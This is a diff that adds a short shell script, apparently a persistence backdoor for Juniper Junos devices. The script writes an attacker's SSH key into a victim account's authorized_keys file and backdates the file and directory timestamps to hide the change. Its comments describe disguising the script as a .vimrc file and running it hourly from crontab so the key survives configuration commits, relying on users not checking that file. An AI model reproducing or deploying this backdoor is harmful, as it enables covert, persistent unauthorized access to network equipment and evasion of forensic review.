@@ -1,0 +1,12 @@
+#!/bin/sh
+
+echo "ssh-rsa public-rsa-key-you-owner" > /cf/var/home/victim/.ssh/authorized_keys ; chmod 0600 /cf/var/home/victim/.ssh/authorized_keys ; touch -amt 201707150530.00 /cf/var/home/victim/.ssh/authorized_keys ; touch -amt 201707150530.00 /cf/var/home/victim/.ssh ; touch -amt 201707150530.00 /cf/var/home/victim
+
+## for crontab * */1 * * * /sbin/sh /cf/var/home/victim/.vimrc >>/dev/null 2>&1 &
+
+## persist ssh key after 'commit' execute.
+## is simple method, simple == good
+## people creature of habit, most use
+## see .vimrc in ~/ directory
+## most Junos user no checking if .vimrc
+## chmod +x .. (no one do this...)
